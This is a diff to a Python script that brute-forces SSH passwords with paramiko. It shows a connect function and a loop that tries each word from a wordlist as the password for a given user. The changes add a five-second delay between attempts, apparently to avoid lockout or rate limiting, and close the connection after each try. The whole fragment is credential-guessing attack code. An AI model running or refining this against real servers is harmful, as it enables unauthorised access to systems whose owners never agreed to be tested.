@@ -1,5 +1,6 @@
 import paramiko
 import sys
+import time
 
 def ssh_connect(ip, port, username, password):
     client = paramiko.SSHClient()
@@ -10,8 +11,11 @@ def ssh_connect(ip, port, username, password):
         return True
     except paramiko.AuthenticationException:
         return False
-    except Exception:
+    except Exception as e:
         return False
+    finally:
+    	client.close()
+        
 
 def brute_force(ip, port, username, wordlist):
     
@@ -20,6 +24,7 @@ def brute_force(ip, port, username, wordlist):
         with open(wordlist, "r") as file:
             for line in file:
                 word = line.strip()
+                time.sleep(5)
 
                 if not word:
                     continue
